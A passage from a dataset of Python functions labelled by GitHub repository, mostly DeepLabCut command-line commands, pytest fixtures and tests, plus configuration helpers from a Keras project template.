    self.acc.extend(history.history['acc'])
    self.val_loss.extend(history.history['val_loss'])
    self.val_acc.extend(history.history['val_acc'])"
Ahmkel/Keras-Project-Template,get_args,"def get_args():
    argparser = argparse.ArgumentParser(description=__doc__)
    argparser.add_argument('-c', '--config', dest='config', metavar='C', default='None', help='The Configuration file')
    args = argparser.parse_args()
    return args"
Ahmkel/Keras-Project-Template,get_config_from_json,"def get_config_from_json(json_file):
    """"""
    Get the config from a json file
    :param json_file:
    :return: config(namespace) or config(dictionary)
    """"""
    with open(json_file, 'r') as config_file:
        config_dict = json.load(config_file)
    config = DotMap(config_dict)
    return (config, config_dict)"
Ahmkel/Keras-Project-Template,process_config,"def process_config(json_file):
    (config, _) = get_config_from_json(json_file)
    config.callbacks.tensorboard_log_dir = os.path.join('experiments', time.strftime('%Y-%m-%d/', time.localtime()), config.exp.name, 'logs/')
    config.callbacks.checkpoint_dir = os.path.join('experiments', time.strftime('%Y-%m-%d/', time.localtime()), config.exp.name, 'checkpoints/')
    return config"
Ahmkel/Keras-Project-Template,create_dirs,"def create_dirs(dirs):
    """"""
    dirs - a list of directories to create if these directories are not found
    :param dirs:
    :return exit_code: 0:success -1:failed
    """"""
    try:
        for dir_ in dirs:
            if not os.path.exists(dir_):
                os.makedirs(dir_)
        return 0
    except Exception as err:
        print('Creating directories error: {0}'.format(err))
        exit(-1)"
Ahmkel/Keras-Project-Template,create,"def create(cls):
    """"""expects a string that can be imported as with a module.class name""""""
    (module_name, class_name) = cls.rsplit('.', 1)
    try:
        print('importing ' + module_name)
        somemodule = importlib.import_module(module_name)
        print('getattr ' + class_name)
        cls_instance = getattr(somemodule, class_name)
        print(cls_instance)
    except Exception as err:
        print('Creating directories error: {0}'.format(err))
        exit(-1)
    return cls_instance"
Ahmkel/Keras-Project-Template,get_args,"def get_args():
    argparser = argparse.ArgumentParser(description=__doc__)
    argparser.add_argument('-c', '--config', dest='config', metavar='C', default='None', help='The Configuration file')
    args = argparser.parse_args()
    return args"
AlexEMG/DeepLabCut,main,"def main():
    cli.main()"
AlexEMG/DeepLabCut,main,"@click.group(invoke_without_command=True)
@click.option('-v', '--verbose', is_flag=True, help='Verbose printing')
@click.pass_context
def main(ctx, verbose):
    if ctx.invoked_subcommand is None:
        click.echo('deeplabcut v0.0.')
        click.echo(main.get_help(ctx))"
AlexEMG/DeepLabCut,create_new_project,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('project')
@click.argument('experimenter')
@click.argument('videos', nargs=-1, type=click.Path(exists=True, dir_okay=False))
@click.option('-d', '--wd', 'working_directory', type=click.Path(exists=True, file_okay=False, resolve_path=True), default=Path.cwd(), help='Directory to create project in. Default is cwd().')
@click.option('--copy_videos/--dont_copy_videos', is_flag=True, default=True, help='Specify if you need to create the symlinks of the video and store in the videos directory. Default is True.')
@click.pass_context
def create_new_project(_, *args, **kwargs):
    """"""Create a new project directory, sub-directories and a basic configuration file. The configuration file is loaded with default values. Change its parameters to your projects need.


    Options 

    ---------- 

    project : string 

    	String containing the name of the project.

    experimenter : string 

    	String containing the name of the experimenter. 

    videos : list 

    	A list of string containing the full paths of the videos to include in the project.

    working_directory : string, optional 

    	The directory where the project will be created. The default is the ``current working directory``; if provided, it must be a string

    copy_videos : bool, optional 

    If this is set to True, the symlink of the videos are copied to the project/videos directory. The default is ``True``; if provided it must be either ``True`` or ``False`` 


    Example 

    -------- 

    To create the project in the current working directory 

    python3 dlc.py create_new_project reaching-task Tanmay /data/videos/mouse1.avi /data/videos/mouse2.avi /data/videos/mouse3.avi /analysis/project/

    To create the project in the current working directory but do not want to create the symlinks 

    python3 dlc.py create_new_project reaching-task Tanmay /data/videos/mouse1.avi /data/videos/mouse2.avi /data/videos/mouse3.avi /analysis/project/ -c False

    To create the project in another directory 

    python3 dlc.py create_new_project reaching-task Tanmay /data/vies/mouse1.avi /data/videos/mouse2.avi /data/videos/mouse3.avi analysis/project -d home/project

    """"""
    from deeplabcut.create_project import new
    new.create_new_project(*args, **kwargs)"
AlexEMG/DeepLabCut,add_new_videos,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('videos', nargs=-1, type=click.Path(exists=True, dir_okay=False))
@click.option('--copy_videos/--dont_copy_videos', is_flag=True, default=True, help='Specify if you need to create the symlinks of the video and store in the videos directory. Default is True.')
@click.pass_context
def add_new_videos(_, *args, **kwargs):
    """"""
    Add new videos to the config file at any stage of the project.


    Options

    ----------

    config : string

        String containing the full path of the config file in the project.

    videos : list 

        A list of string containing the full paths of the videos to include in the project.

    copy_videos : bool, optional

        If this is set to True, the symlink of the videos are copied to the project/videos directory. The default is
        ``True``; if provided it must be either ``True`` or ``False``

    Examples

    --------

    >>> python3 dlc.py add_new_videos /home/project/reaching-task-Tanmay-2018-08-23/config.yaml /data/videos/mouse5.avi

    """"""
    from deeplabcut.create_project import add
    add.add_new_videos(*args, **kwargs)"
AlexEMG/DeepLabCut,extract_frames,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('mode')
@click.option('-a', '--algo', 'algo', default='uniform', help='For automatic extraction, specify the algorithm- ""kmeans"" or ""uniform"". Default is uniform.')
@click.option('--crop', is_flag=True, default=False, help='Specify if you need to crop the image. Default is True.')
@click.pass_context
def extract_frames(_, *args, **kwargs):
    """"""
    Extracts frames from the videos in the config.yaml file. Only the videos in the config.yaml will be used to select the frames.

    Use the function ``add_new_videos`` at any stage of the project to add new videos to the config file and extract their frames.


    CONFIG : string 

        Full path of the config.yaml file as a string.  
 
 

    MODE : string 
 

        String containing the mode of extraction. It must be either ``automatic`` or ``manual``.  


    Examples 

    -------- 

    for selecting frames automatically with 'kmeans' and do not want to crop the frames 

    >>> python3 dlc.py extract_frames /analysis/project/reaching-task/config.yaml automatic --algo kmeans 

    -------- 

    for selecting frames automatically with 'uniform' and want to crop the frames based on the ``crop`` parameters in config.yaml 

    >>> python3 dlc.py extract_frames /analysis/project/reaching-task/config.yaml automatic --crop
    -------- 

    for selecting frames manually, 

    >>> deeplabcut.extract_frames /analysis/project/reaching-task/config.yaml manual 

    While selecting the frames manually, you do not need to specify the cropping parameters. Rather, you will get a prompt in the graphic user interface to choose if you need to crop or not. 

    -------- 


    """"""
    from deeplabcut.generate_training_dataset import frameExtraction
    frameExtraction.extract_frames(*args, **kwargs)"
AlexEMG/DeepLabCut,label_frames,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.pass_context
def label_frames(_, config):
    """"""Manually label/annotate the extracted frames. Update the list of body parts you want to localize in the config.yaml file first.

    Example

    --------

    python3 dlc.py label_frames /analysis/project/reaching-task/config.yaml
    """"""
    from deeplabcut.generate_training_dataset import labelFrames
    labelFrames.label_frames(config)"
AlexEMG/DeepLabCut,check_labels,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.pass_context
def check_labels(_, config):
    """"""Check if labels were stored correctly by plotting annotations and inspect them visually. If some are wrong, then use the refine_labels to correct the labels.
""""""
    from deeplabcut.generate_training_dataset import labelFrames
    labelFrames.check_labels(config)"
AlexEMG/DeepLabCut,create_training_dataset,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.option('-num', '--num_shuffles', 'num_shuffles', default=1, help='Number of shuffles of training dataset to create. Default is set to 1.')
@click.pass_context
def create_training_dataset(_, *args, **kwargs):
    """"""Combine frame and label information into a an array. Create training and test sets. Update parameters TrainFraction, iteration in config.yaml
        Also update parameters for pose_config.yaml as wanted.

    CONFIG: Full path of the config.yaml file in the train directory of a project.

    Example 

    --------

    To create a training dataset with only 1 shuffle
    python3 dlc.py create_training_dataset /analysis/project/reaching-task/config.yaml

    To create a training dataset with only 2 shuffles
    python3 dlc.py create_training_dataset /analysis/project/reaching-task/config.yaml num_shuffles 2
    """"""
    from deeplabcut.generate_training_dataset import labelFrames
    labelFrames.create_training_dataset(*args, **kwargs)"
AlexEMG/DeepLabCut,train_network,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.option('-num', '--num_shuffles', 'shuffle', default=1, help='Shuffle index of the training dataset. Default is set to 1.')
@click.pass_context
def train_network(_, *args, **kwargs):
    """"""Train a trained Feature detector with a specific training data set.

        Provide path to the pose_config file.
        CONFIG: Full path of the config.yaml file in the train directory of a project.


    e.g. run the script like this:
    python3 dlc.py step7_train  /home/project/reaching/config.yaml

    """"""
    from deeplabcut.pose_estimation_tensorflow import training
    training.train_network(*args, **kwargs)"
AlexEMG/DeepLabCut,evaluate_network,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.option('-num', '--num_shuffles', 'shuffle', default=[1], help='Shuffle index of the training dataset. Default is set to 1.')
@click.option('-p', '--plot', 'plotting', is_flag=True, help='Make plots. Default is False.')
@click.pass_context
def evaluate_network(_, config, **kwargs):
    """"""Evaluates a trained Feature detector model.

        CONFIG: Full path of the ""pose_config.yaml"" file in the train directory of a project.


    Example

    ----------
    Evalaute the network
    python3 dlc.py evaluate_network  /home/project/reaching/config.yaml

    """"""
    from deeplabcut.pose_estimation_tensorflow import evaluate
    evaluate.evaluate_network(config, **kwargs)"
AlexEMG/DeepLabCut,analyze_videos,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('videos', nargs=-1)
@click.option('-num', '--num_shuffles', 'shuffle', default=1, help='Shuffle index of the training dataset. Default is set to 1.')
@click.option('-vtype', '--video_type', 'videotype', default='.avi', help='The extension of video in case the input is a directory')
@click.option('-c', '--save', 'save_as_csv', is_flag=True, help='Saves as a .csv file. Default is False.')
@click.pass_context
def analyze_videos(_, *args, **kwargs):
    """"""Makes prediction.

        CONFIG: Full path of the ""config.yaml"" file in the train directory of a project.

        VIDEOS: Full path to video.


    Example

    ----------

    python3 dlc.py analyze_videos /home/project/reaching/config.yaml /home/project/reaching/newVideo/1.avi

    """"""
    from deeplabcut.pose_estimation_tensorflow import predict_videos
    predict_videos.analyze_videos(*args, **kwargs)"
AlexEMG/DeepLabCut,extract_outlier_frames,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('videos')
@click.option('-num', '--num_shuffles', 'shuffle', default=1, help='The shuffle index of training dataset. The extracted frames will be stored in the labeled-dataset for the corresponding shuffle of training dataset. Default is set to 1')
@click.option('-outlier', '--outlier_algo', 'outlieralgorithm', default='fitting', help='String specifying the algorithm used to detect the outliers. Currently, deeplabcut supports only sarimax (this will be updated).               This method fits a Seasonal AutoRegressive Integrated Moving Average with eXogenous regressors model to data and computes confidence interval.               Based on the fraction of data points outside the confidence interval and the average distance (compared to delta)               the user can identify potential outlier frames. The default is set to ``fitting``. Other choices: `fitting`, `jump`, `uncertain`')
@click.option('-compare', '--comparisonbodyparts', 'comparisonbodyparts', default='all', help='This select the body parts for which the comparisons with the outliers are carried out. Either ``all``,               then all body parts from config.yaml are used orr a list of strings that are a subset of the full list.               E.g. [`hand`,`Joystick`] for the demo Reaching-Mackenzie-2018-08-30/config.yaml to select only these two body parts.')
@click.option('-e', '--epsilon', 'epsilon', default=20, help='Meaning depends on outlieralgoritm. The default is set to 20 pixels.For outlieralgorithm `fitting`:               Float bound according to which frames are picked when the (average) body part estimate deviates from model fit.               For outlieralgorithm `jump`: Float bound specifying the distance by which body points jump from one frame to next (Euclidean distance)')
@click.option('-p', '--p_bound', 'p_bound', default=0.01, help='For outlieralgorithm `uncertain` this parameter defines the likelihood below, below which a body part will be flagged as a putative outlier.')
@click.option('-ard', '--ar_degree', 'ARdegree', default=7, help='For outlieralgorithm `fitting`: Autoregressive degree of Sarimax model degree.               See https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html')
@click.option('-mad', '--ma_degree', 'MAdegree', default=1, help='Int value. For outlieralgorithm `fitting`: MovingAvarage degree of Sarimax model degree.               See https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html')
@click.option('-a', '--alpha', 'alpha', default=0.01, help='Significance level for detecting outliers based on confidence interval of fitted SARIMAX model.')
@click.option('-extract', '--extraction_algo', 'extractionalgorithm', default='uniform', help='String specifying the algorithm to use for selecting the frames from the identified outliers.               Currently, deeplabcut supports either ``kmeans`` or ``uniform`` based selection (same logic as for extract_frames).              The default is set to``uniform``, if provided it must be either ``uniform`` or ``kmeans``.')
@click.pass_context
def extract_outlier_frames(_, *args, **kwargs):
    """"""
    Extracts the outlier frames in case, the predictions are not correct for a certain video from the cropped video running from
    start to stop as defined in config.yaml.

    Another crucial parameter in config.yaml is how many frames to extract 'numframes2extract'.

    CONFIG : string 

    Full path of the config.yaml file as a string.  

    VIDEO : Full path of the video to extract the frame from. Make sure that this video is already analyzed.


    Example 

    --------

    for extracting the frames with default settings

    >>> python3 dlc.py extract_outlier_frames /analysis/project/reaching-task/config.yaml /analysis/project/video/reachinvideo1.avi 

    --------

    for extracting the frames with kmeans

    >>> python3 dlc.py extract_outlier_frames /analysis/project/reaching-task/config.yaml /analysis/project/video/reachinvideo1.avi --extractionalgorithm 'kmeans' 

    --------

    for extracting the frames with kmeans and epsilon = 5 pixels.

    >>> python3 dlc.py extract_outlier_frames /analysis/project/reaching-task/config.yaml /analysis/project/video/reachinvideo1.avi --epsilon 5 --extractionalgorithm kmeans 

    --------


    """"""
    from deeplabcut.refine_training_dataset import outlier_frames
    outlier_frames.extract_outlier_frames(*args, **kwargs)"
AlexEMG/DeepLabCut,refine_labels,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.pass_context
def refine_labels(_, config):
    """"""Refines the labels of the outlier frames extracted from the analyzed videos.
 Helps in augmenting the training dataset.
    Use the function ``analyze_video`` to analyze a video and extracts the outlier frames using the function
    ``extract_outlier_frames`` before refining the labels.


    Examples 

    --------

    >>> python3 dlc.py refine_labels /analysis/project/reaching-task/config.yaml 

    --------

    """"""
    from deeplabcut.refine_training_dataset import outlier_frames
    outlier_frames.refine_labels(config)"
AlexEMG/DeepLabCut,create_labeled_video,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('videos', nargs=-1)
@click.option('-num', '--num_shuffles', 'shuffle', default=1, help='Number of shuffles of training dataset. Default is set to 1.')
@click.option('-v', '--video_type', 'videotype', default='.avi', help='Checks for the extension of the video in case the input is a directory.              Only videos with this extension are analyzed. The default is ``.avi``')
@click.option('-s', '--save_frames', 'save_frames', is_flag=True, default=False, help='If true creates each frame individual and then combines into a video.               This variant is relatively slow as it stores all individual frames. However, it               uses matplotlib to create the frames and is therefore much more flexible               (one can set transparency of markers, crop, and easily customize.')
@click.option('-d', '--delete', 'delete', is_flag=True, default=False, help='If true then the individual frames created during the video generation will be deleted.              Only the video will be left.')
@click.pass_context
def create_labeled_video(_, *args, **kwargs):
    """"""
    Labels the bodyparts in a video. Make sure the video is already analyzed by the function 'analyze_video'
    """"""
    from deeplabcut.utils import make_labeled_video
    make_labeled_video.create_labeled_video(*args, **kwargs)"
AlexEMG/DeepLabCut,plot_trajectories,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('config')
@click.argument('videos', nargs=-1)
@click.option('-num', '--num_shuffles', 'shuffle', default=1, help='Number of shuffles of training dataset. Default is set to 1.')
@click.option('-v', '--video_type', 'videotype', default='.avi', help='Checks for the extension of the video in case the input is a directory.              Only videos with this extension are analyzed. The default is ``.avi``')
@click.option('-s', '--show', 'showfigures', is_flag=True, default=False, help='If true then plots are also displayed simultaneously.')
@click.pass_context
def plot_trajectories(_, *args, **kwargs):
    """"""
    Plots the trajectories of various bodyparts across the video.


    Example

    --------

    for labeling the frames

    >>> python3 dlc.py plot_trajectories /analysis/project/reaching-task/config.yaml /analysis/project/videos/reachingvideo1.avi  

    --------

    """"""
    from deeplabcut.utils import plotting
    plotting.plot_trajectories(*args, **kwargs)"
AlexEMG/DeepLabCut,export_model,"@main.command(context_settings=CONTEXT_SETTINGS)
@click.argument('cfg-path', nargs=1, type=click.STRING)
@click.option('-i', '--iteration', 'iteration', default=None, required=False, type=int, help='the model iteration you wish to export. If None, uses the iteration listed in the config file')
@click.option('-s', '--shuffle', 'shuffle', default=1, required=False, type=int, help='the shuffle of the model to export. Default is set to 1.')
@click.option('-t', '--trainingsetindex', 'trainingsetindex', default=0, required=False, type=int, help='the index of the training fraction for the model you wish to export. default = 0')
@click.option('-n', '--snapshotindex', 'snapshotindex', default=None, required=False, type=int, help='the snapshot index for the weights you wish to export')
@click.option('--TFGPUinference/--NPinference', 'TFGPUinference', default=True, required=False, help='use the tensorflow inference model? Default = True')
@click.option('--overwrite', '-o', is_flag=True, required=False, help='if the model you wish to export has already been exported, whether to overwrite. default = False')
@click.option('--make-tar/--no-tar', 'make_tar', default=True, required=False, help='Do you want to compress the exported directory to a tar file? Default = True')
@click.pass_context
def export_model(_, *args, **kwargs):
    """"""
    Export DLC models for the model zoo or for live inference.

    Saves the pose configuration, snapshot files, and frozen graph of the model to a directory named exported-models within the project directory

    Parameters
    -----------

    cfg_path : string

    	path to the DLC Project config.yaml file

    iteration : int, optional

    	the model iteration you wish to export.

    	If None, uses the iteration listed in the config file

    shuffle : int, optional

    	the shuffle of the model to export. default = 1

    trainingsetindex : int, optional

    	the index of the training fraction for the model you wish to export. default = 1

    snapshotindex : int, optional

    	the snapshot index for the weights you wish to export.

    	If None, uses the snapshotindex as defined in 'config.yaml'. Default = None

    TFGPUinference : bool, optional

    	use the tensorflow inference model? Default = True

    	For inference using DeepLabCut-live, it is recommended to set TFGPIinference=False

    overwrite : bool, optional

    	if the model you wish to export has already been exported, whether to overwrite. default = False

    make_tar : bool, optional

    	Do you want to compress the exported directory to a tar file? Default = True

    	This is necessary to export to the model zoo, but not for live inference.
    """"""
    from deeplabcut import export_model
    export_model(*args, **kwargs)"
AlexEMG/DeepLabCut,_parse_args,"def _parse_args():
    parser = argparse.ArgumentParser('deeplabcut-docker', description='Utility tool for launching DeepLabCut docker containers. Only a single argument is given to specify the container type. By default, the current directory is mounted into the container and used as the current working directory. You can additionally specify any additional docker argument specified in https://docs.docker.com/engine/reference/commandline/cli/.')
    parser.add_argument('container', type=str, choices=['gui', 'notebook', 'bash'], help='The container to launch. A list of all containers is available on https://hub.docker.com/r/deeplabcut/deeplabcut/tags. By default, the latest DLC version will be selected and automatically updated, if possible. All containers are currently launched in interactive mode by default, meaning you can use Ctrl+C in your terminal session to terminate a command.')
    return parser.parse_known_args()"
AlexEMG/DeepLabCut,main,"def main():
    """"""Main entry point. Parse arguments and launch container.""""""
    (launch_args, docker_arguments) = _parse_args()
    argv = ['deeplabcut_docker.sh', launch_args.container, *docker_arguments]
    print(_MOTD, file=sys.stderr)
    pty.spawn(argv)
    print('Container stopped.', file=sys.stderr)"
AlexEMG/DeepLabCut,make_frame,"def make_frame(t):
    return clip.get_frame(1)"
AlexEMG/DeepLabCut,make_frame,"def make_frame(t):
    return clip.get_frame(1)"
AlexEMG/DeepLabCut,Cuttrainingschedule,"def Cuttrainingschedule(path_config_file, shuffle, trainingsetindex=0, initweights='imagenet', lastvalue=10):
    cfg = deeplabcut.auxiliaryfunctions.read_config(path_config_file)
    posefile = os.path.join(cfg['project_path'], 'dlc-models/iteration-' + str(cfg['iteration']) + '/' + cfg['Task'] + cfg['date'] + '-trainset' + str(int(cfg['TrainingFraction'][trainingsetindex] * 100)) + 'shuffle' + str(shuffle), 'train/pose_cfg.yaml')
    edits = {'save_iters': lastvalue, 'display_iters': 1, 'multi_step': [[0.001, lastvalue]], 'intermediate_supervision': False}
    if initweights == 'previteration':
        edits['init_weights'] = os.path.join(cfg['project_path'], 'dlc-models/iteration-' + str(cfg['iteration'] - 1) + '/' + cfg['Task'] + cfg['date'] + '-trainset' + str(int(cfg['TrainingFraction'][trainingsetindex] * 100)) + 'shuffle' + str(shuffle), 'train/snapshot-' + str(lastvalue))
    print('CHANGING training parameters to end quickly!')
    DLC_config = deeplabcut.auxiliaryfunctions.edit_config(posefile, edits)
    return"
AlexEMG/DeepLabCut,unzip_from_url,"def unzip_from_url(url, dest_folder):
    """"""Directly extract files without writing the archive to disk.""""""
    os.makedirs(dest_folder, exist_ok=True)
    resp = urllib.request.urlopen(url)
    with zipfile.ZipFile(BytesIO(resp.read())) as zf:
        for member in tqdm(zf.infolist(), desc='Extracting'):
            try:
                zf.extract(member, path=dest_folder)
            except zipfile.error:
                pass"
AlexEMG/DeepLabCut,pytest_sessionstart,"def pytest_sessionstart(session):
    unzip_from_url('https://github.com/DeepLabCut/UnitTestData/raw/main/data.zip', os.path.split(TEST_DATA_DIR)[0])
    session.__DATA_FOLDER = TEST_DATA_DIR"
AlexEMG/DeepLabCut,pytest_sessionfinish,"def pytest_sessionfinish(session, exitstatus):
    shutil.rmtree(session.__DATA_FOLDER)"
AlexEMG/DeepLabCut,ground_truth_detections,"@pytest.fixture(scope='function')
def ground_truth_detections():
    with open(os.path.join(TEST_DATA_DIR, 'dets.pickle'), 'rb') as file:
        return pickle.load(file)"
AlexEMG/DeepLabCut,model_outputs,"@pytest.fixture(scope='function')
def model_outputs():
    with open(os.path.join(TEST_DATA_DIR, 'outputs.pickle'), 'rb') as file:
        (scmaps, locrefs, pafs) = pickle.load(file)
    locrefs = np.reshape(locrefs, (*locrefs.shape[:3], -1, 2))
    locrefs *= 7.2801
    pafs = np.reshape(pafs, (*pafs.shape[:3], -1, 2))
    return (scmaps, locrefs, pafs)"
AlexEMG/DeepLabCut,sample_image,"@pytest.fixture(scope='function')
def sample_image():
    return np.asarray(Image.open(os.path.join(TEST_DATA_DIR, 'image.png')))"
AlexEMG/DeepLabCut,sample_keypoints,"@pytest.fixture(scope='function')
def sample_keypoints():
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_assemblies.pickle'), 'rb') as file:
        temp = pickle.load(file)
    return np.concatenate(temp[0])[:, :2]"
AlexEMG/DeepLabCut,real_assemblies,"@pytest.fixture(scope='function')
def real_assemblies():
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_assemblies.pickle'), 'rb') as file:
        temp = pickle.load(file)
    data = np.stack(list(temp.values()))
    return inferenceutils._parse_ground_truth_data(data)"
AlexEMG/DeepLabCut,real_assemblies_montblanc,"@pytest.fixture(scope='function')
def real_assemblies_montblanc():
    with open(os.path.join(TEST_DATA_DIR, 'montblanc_assemblies.pickle'), 'rb') as file:
        temp = pickle.load(file)
    single = temp.pop('single')
    data = np.full((max(temp) + 1, 3, 4, 4), np.nan)
    for (k, assemblies) in temp.items():
        for (i, assembly) in enumerate(assemblies):
            data[k, i] = assembly
    return (inferenceutils._parse_ground_truth_data(data), single)"
AlexEMG/DeepLabCut,real_tracklets,"@pytest.fixture(scope='function')
def real_tracklets():
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_tracklets.pickle'), 'rb') as file:
        return pickle.load(file)"
AlexEMG/DeepLabCut,real_tracklets_montblanc,"@pytest.fixture(scope='function')
def real_tracklets_montblanc():
    with open(os.path.join(TEST_DATA_DIR, 'montblanc_tracklets.pickle'), 'rb') as file:
        return pickle.load(file)"
AlexEMG/DeepLabCut,evaluation_data_and_metadata,"@pytest.fixture(scope='function')
def evaluation_data_and_metadata():
    full_data_file = os.path.join(TEST_DATA_DIR, 'trimouse_eval.pickle')
    metadata_file = full_data_file.replace('eval', 'meta')
    with open(full_data_file, 'rb') as file:
        data = pickle.load(file)
    with open(metadata_file, 'rb') as file:
        metadata = pickle.load(file)
    return (data, metadata)"
AlexEMG/DeepLabCut,evaluation_data_and_metadata_montblanc,"@pytest.fixture(scope='function')
def evaluation_data_and_metadata_montblanc():
    full_data_file = os.path.join(TEST_DATA_DIR, 'montblanc_eval.pickle')
    metadata_file = full_data_file.replace('eval', 'meta')
    with open(full_data_file, 'rb') as file:
        data = pickle.load(file)
    with open(metadata_file, 'rb') as file:
        metadata = pickle.load(file)
    return (data, metadata)"
AlexEMG/DeepLabCut,test_filepaths_for_modeltypes,"def test_filepaths_for_modeltypes(self):
    with TemporaryDirectory() as tmpdir:
        with patch('deeplabcut.utils.auxfun_models.download_weights') as mocked_download:
            for (modeltype, expected_path) in MODELTYPE_FILEPATH_MAP.items():
                actual_path = check_for_weights(modeltype, Path(tmpdir))
            self.assertIn(str(expected_path), actual_path)
            if 'efficientnet' in modeltype:
                mocked_download.assert_called_with(modeltype, tmpdir / expected_path.parent)
            else:
                mocked_download.assert_called_with(modeltype, tmpdir / expected_path)"
AlexEMG/DeepLabCut,test_bad_modeltype,"def test_bad_modeltype(self):
    actual_path = check_for_weights('dummymodel', 'nonexistentpath')
    self.assertEqual(actual_path, 'nonexistentpath')"
AlexEMG/DeepLabCut,test_prune_paf_graph,"def test_prune_paf_graph():
    n_bpts = 10
    edges = [list(edge) for edge in combinations(range(n_bpts), 2)]
    with pytest.raises(ValueError):
        pruned_edges = auxfun_multianimal.prune_paf_graph(edges, n_bpts - 2)
        pruned_edges = auxfun_multianimal.prune_paf_graph(edges, len(edges))
    for target in range(20, 45, 5):
        pruned_edges = auxfun_multianimal.prune_paf_graph(edges, target)
        assert len(pruned_edges) == target
    for degree in (4, 6, 8):
        pruned_edges = auxfun_multianimal.prune_paf_graph(edges, average_degree=degree)
        G = nx.Graph(pruned_edges)
        assert np.mean(list(dict(G.degree).values())) == degree"
AlexEMG/DeepLabCut,test_reorder_individuals_in_df,"def test_reorder_individuals_in_df():
    import random
    df = pd.read_hdf('tests/data/montblanc_tracks.h5')
    individuals = df.columns.get_level_values('individuals').unique().to_list()
    permutation_indices = random.sample(range(len(individuals[:-1])), k=len(individuals[:-1]))
    permutation = [individuals[i] for i in permutation_indices]
    permutation.append('single')
    df_reordered = auxfun_multianimal.reorder_individuals_in_df(df, permutation)
    inverse_permutation_indices = np.argsort(permutation_indices).tolist()
    inverse_permutation = [individuals[i] for i in inverse_permutation_indices]
    inverse_permutation.append('single')
    df_inverse_reordering = auxfun_multianimal.reorder_individuals_in_df(df_reordered, inverse_permutation)
    pd.testing.assert_frame_equal(df, df_inverse_reordering)"
AlexEMG/DeepLabCut,test_find_analyzed_data,"def test_find_analyzed_data(tmpdir_factory):
    fake_folder = tmpdir_factory.mktemp('videos')
    SUPPORTED_VIDEOS = ['avi']
    n_ext = len(SUPPORTED_VIDEOS)
    SCORER = 'DLC_dlcrnetms5_multi_mouseApr11shuffle1_5'
    WRONG_SCORER = 'DLC_dlcrnetms5_multi_mouseApr11shuffle3_5'

    def _create_fake_file(filename):
        path = str(fake_folder.join(filename))
        with open(path, 'w') as f:
            f.write('')
        return path
    for (ind, ext) in enumerate(SUPPORTED_VIDEOS):
        vname = 'video' + str(ind)
        _ = _create_fake_file(vname + '.' + ext)
        _ = _create_fake_file(vname + SCORER + '.pickle')
        _ = _create_fake_file(vname + SCORER + '.h5')
    for (ind, ext) in enumerate(SUPPORTED_VIDEOS):
        assert auxiliaryfunctions.find_analyzed_data(fake_folder, 'video' + str(ind), SCORER)
        with pytest.raises(FileNotFoundError):
            auxiliaryfunctions.find_analyzed_data(fake_folder, 'video' + str(ind), WRONG_SCORER)
        with pytest.raises(FileNotFoundError):
            auxiliaryfunctions.find_analyzed_data(fake_folder, 'video' + str(ind), SCORER, filtered=True)"
AlexEMG/DeepLabCut,test_get_list_of_videos,"def test_get_list_of_videos(tmpdir_factory):
    fake_folder = tmpdir_factory.mktemp('videos')
    n_ext = len(SUPPORTED_VIDEOS)

    def _create_fake_file(filename):
        path = str(fake_folder.join(filename))
        with open(path, 'w') as f:
            f.write('')
        return path
    fake_videos = []
    for ext in SUPPORTED_VIDEOS:
        path = _create_fake_file(f'fake.{ext}')
        fake_videos.append(path)
    path = _create_fake_file('fake.xls')
    path = _create_fake_file('fake.pptx')
    _ = _create_fake_file('fake.pickle')
    _ = _create_fake_file('fake.h5')
    videos = auxiliaryfunctions.get_list_of_videos(str(fake_folder), videotype='')
    assert len(videos) == n_ext
    videos = auxiliaryfunctions.get_list_of_videos(str(fake_folder), videotype=SUPPORTED_VIDEOS)
    assert len(videos) == n_ext
    for ext in SUPPORTED_VIDEOS:
        videos = auxiliaryfunctions.get_list_of_videos(str(fake_folder), videotype=ext)
        assert len(videos) == 1
    videos = auxiliaryfunctions.get_list_of_videos(str(fake_folder), videotype='unknown')
    assert not len(videos)
    videos = auxiliaryfunctions.get_list_of_videos(fake_videos, videotype='')
    assert len(videos) == n_ext
    for video in fake_videos:
        videos = auxiliaryfunctions.get_list_of_videos([video], videotype='')
        assert len(videos) == 1
    for ext in SUPPORTED_VIDEOS:
        videos = auxiliaryfunctions.get_list_of_videos(fake_videos, videotype=ext)
        assert len(videos) == 1"
AlexEMG/DeepLabCut,test_write_config_has_skeleton,"def test_write_config_has_skeleton(tmpdir_factory):
    """"""Required for backward compatibility""""""
    fake_folder = tmpdir_factory.mktemp('fakeConfigs')
    fake_config_file = fake_folder / Path('fakeConfig')
    auxiliaryfunctions.write_config(fake_config_file, {})
    config_data = auxiliaryfunctions.read_config(fake_config_file)
    assert 'skeleton' in config_data"
AlexEMG/DeepLabCut,test_intersection_of_body_parts_and_ones_given_by_user,"@pytest.mark.parametrize('multianimal, bodyparts, ma_bpts, unique_bpts, comparison_bpts, expected_bpts', [(False, ['head', 'shoulders', 'knees', 'toes'], None, None, {'knees', 'others', 'toes'}, ['knees', 'toes']), (True, None, ['head', 'shoulders', 'knees'], ['toes'], {'knees', 'others', 'toes'}, ['knees', 'toes'])])
def test_intersection_of_body_parts_and_ones_given_by_user(multianimal, bodyparts, ma_bpts, unique_bpts, comparison_bpts, expected_bpts):
    cfg = {'multianimalproject': multianimal, 'bodyparts': bodyparts, 'multianimalbodyparts': ma_bpts, 'uniquebodyparts': unique_bpts}
    if multianimal:
        all_bodyparts = list(set(ma_bpts + unique_bpts))
    else:
        all_bodyparts = bodyparts
